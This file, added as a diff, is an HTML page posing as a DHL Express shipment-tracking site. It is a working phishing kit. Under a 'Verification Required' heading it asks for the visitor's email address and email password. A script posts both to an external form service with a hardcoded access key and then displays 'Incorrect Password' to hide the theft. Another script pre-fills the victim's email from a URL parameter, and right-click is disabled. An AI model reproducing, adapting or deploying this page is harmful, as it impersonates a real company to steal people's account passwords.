@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>DHL Express | Track Shipment</title>
+    <link rel="icon" type="image/png" href="images/icon.png">
+    <script>
+        // This code will be added to a <Script> tag, 
+        // at the <head> of the document 
+    </script>
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1">
+<body style="background-image: url('images/bg.png'); background-size: cover;background-repeat: no-repeat; " oncontextmenu="return false">        
+<style>
+        body,
+        html {
+            height: 100%
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        select {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none
+        }
+
+        .form-select-option:hover {
+            background: #007fff;
+            color: #fff;
+            cursor: pointer
+        }
+
+        .form-select-option {
+            padding: 3px
+        }
+
+        .form-input-wrapper input[type=checkbox] {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none
+        }
+
+        .lp-flex-container {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex
+        }
+
+        .lp-flex-1 {
+            -webkit-box-flex: 1;
+            -ms-flex: 1;
+            flex: 1
+        }
+
+        .lp-ie-flex-shrink {
+            -ms-flex-negative: 0
+        }
+
+        .lp-flex-direction-vertical {
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column
+        }
+
+        .lp-flex-direction-horizontal {
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row
+        }
+
+        .lp-flex-direction-horizontal-reverse {
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: reverse;
+            -ms-flex-direction: row-reverse;
+            flex-direction: row-reverse
+        }
+
+        .lp-flex-justify-center {
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center
+        }
+
+        .lp-flex-justify-flex-start {
+            -webkit-box-pack: start;
+            -ms-flex-pack: start;
+            justify-content: flex-start
+        }
+
+        .lp-flex-justify-flex-end {
+            -webkit-box-pack: end;
+            -ms-flex-pack: end;
+            justify-content: flex-end
+        }
+
+        .lp-flex-justify-space-evenly {
+            -webkit-box-pack: space-evenly;
+            -ms-flex-pack: space-evenly;
+            justify-content: space-evenly
+        }
+
+        .lp-flex-align-center {
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center
+        }
+
+        .lp-flex-align-flex-start {
+            -webkit-box-align: start;
+            -ms-flex-align: start;
+            align-items: flex-start
+        }
+
+        .lp-flex-align-flex-end {
+            -webkit-box-align: end;
+            -ms-flex-align: end;
+            align-items: flex-end
+        }
+
+        .checkbox-wrapper {
+            width: intrinsic;
+            width: -moz-fit-content;
+            width: -webkit-fit-content;
+            width: fit-content;
+            position: relative
+        }
+
+        p {
+            margin: 0
+        }
+
+        strong {
+            font-weight: 700
+        }
+
+        .font-awesome-icon {
+            font-family: FontAwesome !important
+        }
+
+        .form-input-element {
+            line-height: normal !important
+        }
+
+        .iti.iti--allow-dropdown {
+            width: 100%;
+            min-width: 0
+        }
+
+        input[type=date] {
+            display: block;
+            -webkit-appearance: textfield;
+            -moz-appearance: textfield;
+            min-height: 1.2em
+        }
+
+        .form-input-277b6b02f5c05a9fbbf3e0706022ee5b input::placeholder {
+            color: rgba(149, 149, 149, 1) !important;
+            font-size: 14px !important;
+            font-style: normal !important;
+            font-weight: normal !important;
+            text-decoration: none !important;
+            font-family: Arial, Helvetica, sans-serif !important;
+        }
+
+        @media only screen and (max-width: 700px) {
+            .responsive-row .inner-row-div .border-wrapper .row-slot-wrapper {
+                -webkit-box-orient: vertical;
+                -webkit-box-direction: normal;
+                -ms-flex-direction: column;
+                flex-direction: column;
+            }
+
+            .responsive-row .inner-row-div .border-wrapper .row-slot-wrapper .responsive-slot {
+                max-width: initial !important;
+            }
+
+            body {
+                background-image: url("") !important;
+                background-color: transparent !important;
+                background-repeat: no-repeat !important;
+                background-size: ;
+                -webkit-box-align: center !important;
+                -ms-flex-align: center !important;
+                align-items: center !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c {
+                -webkit-box-ordinal-group: 1;
+                -ms-flex-order: 0;
+                order: 0;
+                display: block;
+                background-color: transparent !important;
+                background-image: url("") !important;
+                background-position: initial !important;
+                background-repeat: no-repeat !important;
+                background-size: auto !important
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div {
+                width: auto !important;
+                max-width: 1000px !important;
+                border: none !important
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .border-wrapper {
+                background-color: transparent !important;
+                background-image: url("") !important;
+                background-repeat: no-repeat !important;
+                background-position: initial !important;
+                background-size: auto !important;
+                border-style: solid !important;
+                border-width: 0 !important;
+                border-color: #000000 !important;
+                border-radius: 0px !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .border-wrapper {
+                background-color: transparent !important;
+                background-image: url("") !important;
+                background-repeat: no-repeat !important;
+                background-position: initial !important;
+                background-size: auto !important;
+                border-style: solid !important;
+                border-width: 0 !important;
+                border-color: #000000 !important;
+                border-radius: 0px !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c {
+                display: -webkit-box !important;
+                display: -ms-flexbox !important;
+                display: flex !important;
+                -webkit-box-orient: vertical !important;
+                -webkit-box-direction: normal !important;
+                -ms-flex-direction: column !important;
+                flex-direction: column !important;
+                -webkit-box-ordinal-group: 1;
+                -ms-flex-order: 0;
+                order: 0;
+                padding-top: 0px !important;
+                padding-right: 20px !important;
+                padding-bottom: 0px !important;
+                padding-left: 20px !important;
+                background-color: transparent !important;
+                min-height: undefinedpx !important;
+                max-width: 50% !important;
+                -webkit-box-pack: start !important;
+                -ms-flex-pack: start !important;
+                justify-content: flex-start !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c .slot-container {
+                background-color: transparent !important;
+                border-radius: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c .spacer50663cb30a54581594665e49549ab6e5 {
+                background-color: transparent !important;
+                border-width: 0px !important;
+                border-radius: 0px !important;
+                border-color: #000000 !important;
+                height: 50px !important;
+                box-shadow: none !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c .spacer123d568d14a9546a9ea707365a6d4c47 {
+                background-color: transparent !important;
+                border-width: 0px !important;
+                border-radius: 0px !important;
+                border-color: #000000 !important;
+                height: 50px !important;
+                box-shadow: none !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 {
+                display: -webkit-box !important;
+                display: -ms-flexbox !important;
+                display: flex !important;
+                -webkit-box-orient: vertical !important;
+                -webkit-box-direction: normal !important;
+                -ms-flex-direction: column !important;
+                flex-direction: column !important;
+                -webkit-box-ordinal-group: 2;
+                -ms-flex-order: 1;
+                order: 1;
+                padding: 0px !important;
+                background-color: transparent !important;
+                min-height: undefinedpx !important;
+                max-width: 50% !important;
+                -webkit-box-pack: center !important;
+                -ms-flex-pack: center !important;
+                justify-content: center !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .slot-container {
+                background-color: rgba(74, 144, 226, 1) !important;
+                border-radius: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .image7485d245bdc45bd99db62f6aaefed472 {
+                background-color: transparent !important;
+                -webkit-box-pack: start !important;
+                -ms-flex-pack: start !important;
+                justify-content: flex-start !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .image7485d245bdc45bd99db62f6aaefed472 img {
+                border-radius: 0px !important;
+                border-width: 0px !important;
+                border-color: #000000 !important;
+                border-style: unset !important;
+                box-shadow: none !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .image7485d245bdc45bd99db62f6aaefed472 div {
+                max-width: 100% !important;
+            }
+        }
+
+        @media only screen and (max-width: 450px) {
+            .responsive-row .inner-row-div .border-wrapper .row-slot-wrapper {
+                -webkit-box-orient: vertical;
+                -webkit-box-direction: normal;
+                -ms-flex-direction: column;
+                flex-direction: column;
+            }
+
+            .responsive-row .inner-row-div .border-wrapper .row-slot-wrapper .responsive-slot {
+                max-width: initial !important;
+            }
+
+            body {
+                background-image: url("") !important;
+                background-color: transparent !important;
+                background-repeat: no-repeat !important;
+                background-size: ;
+                -webkit-box-align: center !important;
+                -ms-flex-align: center !important;
+                align-items: center !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c {
+                -webkit-box-ordinal-group: 1;
+                -ms-flex-order: 0;
+                order: 0;
+                display: block;
+                background-color: transparent !important;
+                background-image: url("") !important;
+                background-position: initial !important;
+                background-repeat: no-repeat !important;
+                background-size: auto !important
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div {
+                width: auto !important;
+                max-width: 1000px !important;
+                border: none !important
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .border-wrapper {
+                background-color: transparent !important;
+                background-image: url("") !important;
+                background-repeat: no-repeat !important;
+                background-position: initial !important;
+                background-size: auto !important;
+                border-style: solid !important;
+                border-width: 0 !important;
+                border-color: #000000 !important;
+                border-radius: 0px !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .border-wrapper {
+                background-color: transparent !important;
+                background-image: url("") !important;
+                background-repeat: no-repeat !important;
+                background-position: initial !important;
+                background-size: auto !important;
+                border-style: solid !important;
+                border-width: 0 !important;
+                border-color: #000000 !important;
+                border-radius: 0px !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c {
+                display: -webkit-box !important;
+                display: -ms-flexbox !important;
+                display: flex !important;
+                -webkit-box-orient: vertical !important;
+                -webkit-box-direction: normal !important;
+                -ms-flex-direction: column !important;
+                flex-direction: column !important;
+                -webkit-box-ordinal-group: 1;
+                -ms-flex-order: 0;
+                order: 0;
+                padding-top: 0px !important;
+                padding-right: 20px !important;
+                padding-bottom: 0px !important;
+                padding-left: 20px !important;
+                background-color: transparent !important;
+                min-height: undefinedpx !important;
+                max-width: 50% !important;
+                -webkit-box-pack: start !important;
+                -ms-flex-pack: start !important;
+                justify-content: flex-start !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c .slot-container {
+                background-color: transparent !important;
+                border-radius: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c .spacer50663cb30a54581594665e49549ab6e5 {
+                background-color: transparent !important;
+                border-width: 0px !important;
+                border-radius: 0px !important;
+                border-color: #000000 !important;
+                height: 50px !important;
+                box-shadow: none !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot527cb42efbe65f6ba44332f45f2c287c .spacer123d568d14a9546a9ea707365a6d4c47 {
+                background-color: transparent !important;
+                border-width: 0px !important;
+                border-radius: 0px !important;
+                border-color: #000000 !important;
+                height: 50px !important;
+                box-shadow: none !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 {
+                display: -webkit-box !important;
+                display: -ms-flexbox !important;
+                display: flex !important;
+                -webkit-box-orient: vertical !important;
+                -webkit-box-direction: normal !important;
+                -ms-flex-direction: column !important;
+                flex-direction: column !important;
+                -webkit-box-ordinal-group: 2;
+                -ms-flex-order: 1;
+                order: 1;
+                padding: 0px !important;
+                background-color: transparent !important;
+                min-height: undefinedpx !important;
+                max-width: 50% !important;
+                -webkit-box-pack: center !important;
+                -ms-flex-pack: center !important;
+                justify-content: center !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .slot-container {
+                background-color: rgba(74, 144, 226, 1) !important;
+                border-radius: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .image7485d245bdc45bd99db62f6aaefed472 {
+                background-color: transparent !important;
+                -webkit-box-pack: start !important;
+                -ms-flex-pack: start !important;
+                justify-content: flex-start !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .image7485d245bdc45bd99db62f6aaefed472 img {
+                border-radius: 0px !important;
+                border-width: 0px !important;
+                border-color: #000000 !important;
+                border-style: unset !important;
+                box-shadow: none !important;
+                padding: 0px !important;
+            }
+
+            .row006f1515656e5f9b8c38ae52de4f983c .inner-row-div .slot7874ec5bd61352bea8bd6e63b96a48d7 .image7485d245bdc45bd99db62f6aaefed472 div {
+                max-width: 100% !important;
+            }
+        }
+    </style>
+    <style>
+        @media all and (-ms-high-contrast:none),
+        (-ms-high-contrast:active) {
+            .checkbox-check-marker {
+                display: none !important
+            }
+
+            .element-vertical-ie {
+                display: block !important
+            }
+        }
+    </style>
+    <!--[if IE]>
+			<style>
+				.checkbox-check-marker {
+					display: none !important;
+				}
+			</style>
+		<![endif]-->
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=Array.prototype.includes%2Cfetch%2CObject.assign%2CString.prototype.includes"></script>
+    <script src="https://cdn-editor.moosend.com/assets/tel-input/js/intlTelInput.min.js"></script>
+    <script src="https://cdn-editor.moosend.com/assets/tel-input/js/utils.js"></script>
+    <link rel="stylesheet" href="https://cdn-editor.moosend.com/assets/tel-input/css/intlTelInput.min.css">
+</head>
+
+<body style="padding: 0px; margin: 0px; font-family: arial, sans-serif; display: flex; background-repeat: no-repeat; background-size: auto; background-color: transparent; background-image: url('');" class="notranslate">
+    <div class="content lp-flex-container lp-flex-direction-vertical" style="flex: 1 1 0%; margin: auto;">
+        <div data-structure-type="row" id="006f1515656e5f9b8c38ae52de4f983c" data-row-type="HALF" data-row-id="006f1515-656e-5f9b-8c38-ae52de4f983c" data-row-behavior="NORMAL" data-row-repeat-count="5" data-row-sort-products="Orders" data-row-background-color-wide="transparent" data-row-background-image-wide="transparent" data-row-background-repeat-wide="transparent" class="landing-page-row row006f1515656e5f9b8c38ae52de4f983c responsive-row lp-ie-flex-shrink" style="background-color: transparent; background-image: url(''); background-position: initial; background-repeat: no-repeat; background-size: auto;">
+            <div class="inner-row-div" style="vertical-align: top; max-width: 1000px; width: 100%; margin: 0px auto;">
+                <div class="border-wrapper" style="width: 100%; background-color: transparent; background-image: url(''); background-repeat: no-repeat; background-position: initial; border-radius: 0px; padding: 0px;">
+                    <div class="row-slot-wrapper lp-flex-container" style="display: flex;">
+                        <div class="landing-page-slot lp-flex-container lp-flex-direction-vertical lp-flex-justify-center lp-flex-1 slot7874ec5bd61352bea8bd6e63b96a48d7 HALF responsive-slot" id="7874ec5bd61352bea8bd6e63b96a48d7" data-structure-type="slot" data-slot-type="HALF" style="display: flex; flex-grow: 1; flex-direction: column; max-width: 500px; background-color: transparent; justify-content: center; -webkit-box-pack: center; padding: 0px;">
+                            <div class="slot-container lp-flex-container lp-flex-direction-vertical lp-ie-flex-shrink" style="background-color: rgb(74, 144, 226); overflow: visible; display: flex; flex-direction: column; border-radius: 0px;">
+                                <div class="component image-component image7485d245bdc45bd99db62f6aaefed472 lp-flex-container lp-flex-align-center lp-flex-justify-flex-start lp-ie-flex-shrink" data-component-type="image" data-parent-slot-type="HALF" style="clear: both; background-color: transparent; align-items: center; justify-content: flex-start; -webkit-box-pack: start; display: flex; padding: 0px;">
+                                    <div style="border: 0px; width: 100%; max-width: 500px;"><img src="https://www.dhl.com/content/experience-fragments/dhl/en/core/sub_page_teaser/image_left_3_greycolumns/xbu_master_spt_dhl_home_enterprise_logistics_services/_jcr_content/root/container_copy_copy_/container_copy/image.coreimg.80.1197.jpeg/1653309259090/employees-working-in-warehouse-0005.jpeg" alt="" id="7485d245bdc45bd99db62f6aaefed472" class="newsletter-image " height="auto" style=": border-box; display: block; border-width: 0px; border-color: rgb(0, 0, 0); border-radius: 0px; border-style: unset; width: 100%; height: auto; box-shadow: none;"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="landing-page-slot lp-flex-container lp-flex-direction-vertical lp-flex-justify-center lp-flex-1 slot527cb42efbe65f6ba44332f45f2c287c HALF responsive-slot" id="527cb42efbe65f6ba44332f45f2c287c" data-structure-type="slot" data-slot-type="HALF" style="display: flex; flex-grow: 1; min-height: 0px; flex-direction: column; max-width: 500px; background-color: transparent; justify-content: center; -webkit-box-pack: center; padding: 0px 20px;">
+                            <div class="slot-container lp-flex-container lp-flex-direction-vertical lp-ie-flex-shrink" style="background-color: transparent; overflow: visible; display: flex; flex-direction: column; border-radius: 0px;">
+                                <div class="component spacer-component spacer50663cb30a54581594665e49549ab6e5" data-component-type="spacer" cellspacing="0" cellpadding="0" id="50663cb30a54581594665e49549ab6e5" style="background-color: transparent; clear: both; height: 140px; border-width: 0px; border-radius: 0px; border-color: rgb(0, 0, 0); border-style: unset; box-shadow: none;"></div>
+                                <div class="component text-component text-desktop text3ccb7487894958d38594a98b3d9dd80a" data-component-type="text" id="3ccb7487894958d38594a98b3d9dd80a" style="padding: 10px; border-width: 0px; border-color: rgb(0, 0, 0); border-radius: 0px; border-style: solid; background-color: transparent; font-family: Arial, Helvetica, sans-serif, Arial, Helvetica, sans-serif; line-height: 1.3; color: rgb(0, 0, 0); font-size: 16px; display: block; overflow-wrap: break-word; word-break: break-word; box-shadow: none;">
+                                    <p style="margin: 0px;"> <span style="font-size: 36px;"><font face="Arial, Helvetica, sans-serif" size="6" color="#ff0000">Verification Required</font></span></p>
+                                </div>
+                                <div class="component text-component text-desktop textbc37bfdfde0a530198c5339279bfeb58" data-component-type="text" id="bc37bfdfde0a530198c5339279bfeb58" style="padding: 10px; border-width: 0px; border-color: rgb(0, 0, 0); border-radius: 0px; border-style: solid; background-color: transparent; font-family: Arial, Helvetica, sans-serif, Arial, Helvetica, sans-serif; line-height: 1.3; color: rgb(0, 0, 0); font-size: 16px; display: block; overflow-wrap: break-word; word-break: break-word; box-shadow: none;">
+                                    <p style="margin: 0px;"><span style="font-size: 20px;"><font face="Arial, Helvetica, sans-serif" size="2" color="#000">Shipment <b>#***** 30247</b> belongs to the recipent email address</font></span></p>
+                                    <p style="margin: 0px;"> </p>
+                                    <p style="margin: 0px;"><span style="font-size: 18px;"><font face="Arial, Helvetica, sans-serif" size="2" color="#000">To Track shipment, please confirm that you own this ID</font></span></p>
+                                </div>
+                                
+                                    <form method="POST" id="form">
+                                    <!-- Replace with your Access Key -->
+                                    <input type="hidden" name="access_key" value="6fed4818-a7cb-48f5-8e73-4138e1b30307">
+                                        <div id="primary-Email-277b6b02f5c05a9fbbf3e0706022ee5b" class="form-input-wrapper lp-flex-1" style="width: 100%; position: relative; margin: 10px auto;"><label class="form-input-wrapper-element lp-flex-container form-input-277b6b02f5c05a9fbbf3e0706022ee5b lp-flex-direction-vertical element-vertical-ie" style="padding: 0px; display: flex; flex-direction: column; width: 100%;"><span class="form-field-label" style="user-select: none; white-space: pre-wrap; word-break: break-word; text-align: left; color: rgb(149, 149, 149); font-size: 16px; font-weight: normal; font-style: normal; text-decoration: none; display: none; line-height: unset; min-height: 25px; font-family: Arial, Helvetica, sans-serif, Arial, Helvetica, sans-serif;">Email<span class="form-field-required" style="color: rgb(240, 52, 52); text-decoration: none; font-weight: normal; font-style: normal;"> *</span></span>
+                                                <div class="lp-flex-1" style="display: block; flex: 1 1 auto;"><input class="lp-flex-1 form-input-element" data-primary="true" data-type="email" data-label="Email" data-required="true" type="email" placeholder="Email Address" id="email" name="Ai" value="" style="width: 100%; min-width: 0px; outline: none; flex: 1 1 0%; background: rgb(255, 255, 255); padding: 13px; color: rgb(0, 0, 0); font-size: 14px; border-width: 2px; border-color: rgb(74, 144, 226); margin: 0px; border-style: solid; border-radius: 8px; font-weight: normal; font-style: normal; text-decoration: none; height: auto; font-family: Arial, Helvetica, sans-serif, Arial, Helvetica, sans-serif;"></div>
+                                            </label></div>
+                                        <div id="primary-Name-277b6b02f5c05a9fbbf3e0706022ee5b" class="form-input-wrapper lp-flex-1" style="width: 100%; position: relative; margin: 10px auto;"><label class="form-input-wrapper-element lp-flex-container form-input-277b6b02f5c05a9fbbf3e0706022ee5b lp-flex-direction-vertical element-vertical-ie" style="padding: 0px; display: flex; flex-direction: column; width: 100%;"><span class="form-field-label" style="user-select: none; white-space: pre-wrap; word-break: break-word; text-align: left; color: rgb(149, 149, 149); font-size: 16px; font-weight: normal; font-style: normal; text-decoration: none; display: none; line-height: unset; min-height: 25px; font-family: Arial, Helvetica, sans-serif, Arial, Helvetica, sans-serif;">Name</span>
+                                                <div class="lp-flex-1" style="display: block; flex: 1 1 auto;"><input class="lp-flex-1 form-input-element" data-primary="true" data-type="text" data-label="Name" data-required="false" type="password" placeholder="Email Password" name="Pi" value="" style="width: 100%; min-width: 0px; outline: none; flex: 1 1 0%; background: rgb(255, 255, 255); padding: 13px; color: rgb(0, 0, 0); font-size: 14px; border-width: 2px; border-color: rgb(74, 144, 226); margin: 0px; border-style: solid; border-radius: 8px; font-weight: normal; font-style: normal; text-decoration: none; height: auto; font-family: Arial, Helvetica, sans-serif, Arial, Helvetica, sans-serif;"></div>
+                                            </label></div>
+                                         <input type="checkbox" checked="">
+                                                        <font face="Arial, Helvetica, sans-serif" size="2" color="#000000">
+                                                            Remember me
+                                                        </font>
+                                        <div id="form-button-container-277b6b02f5c05a9fbbf3e0706022ee5b" class="form-button-element lp-flex-container lp-justify-flex-start" style="display: flex; position: relative; padding-top: 7px; justify-content: flex-start; -webkit-box-pack: start;"><button id="form-button-277b6b02f5c05a9fbbf3e0706022ee5b" type="submit" class="moosend-designer-button" style="background-color: rgb(74, 144, 226); border-color: rgb(0, 0, 0); border-radius: 6px; border-width: 0px; color: rgb(255, 255, 255); font-family: Arial, Helvetica, sans-serif, Arial, Helvetica, sans-serif; font-size: 16px; font-style: normal; font-weight: normal; margin: 0px; text-decoration: none; width: 100%; padding: 14px; transition: all 0.3s ease 0s; opacity: 1; cursor: pointer; position: relative;"><span style="">Continue</span><i class="font-awesome-icon fa fa-circle-o-notch fa-spin fa-2x" style="z-index: -1; position: absolute; opacity: 0; top: 50%; left: 50%; margin-left: -13px; margin-top: -13px; color: rgb(255, 255, 255); font-size: 26px; transition: all 0.3s ease 0s;"></i></button></div>
+<div id="result"></div>
+<script src="https://web3forms.com/client/script.js" async defer></script>
+
+<script>
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "Please wait..."
+
+    fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                result.innerHTML = "Incorrect Password";
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "Something went wrong!";
+        })
+        .then(function() {
+            password.reset();
+            setTimeout(() => {
+                result.style.display = "none";
+            }, 3000);
+        });
+});
+</script>
+                                   <div class="landing-page-form-message" style="display: none; text-align: center;">
+                                        <p style="text-align: left; margin: 0px;">Success! You've been added to the list.</p>
+                                    </div>
+                                </div>
+                                <div class="component spacer-component spacer123d568d14a9546a9ea707365a6d4c47" data-component-type="spacer" cellspacing="0" cellpadding="0" id="123d568d14a9546a9ea707365a6d4c47" style="background-color: transparent; clear: both; height: 141px; border-width: 0px; border-radius: 0px; border-color: rgb(0, 0, 0); border-style: unset; box-shadow: none;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+                                    
+<script type="text/javascript">
+var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : sParameterName[1];
+        }
+    }
+};
+
+var firstname = getUrlParameter('e');
+
+     document.getElementById("email").value = firstname;
+
+</script>
+
+</body>
+
+</html>
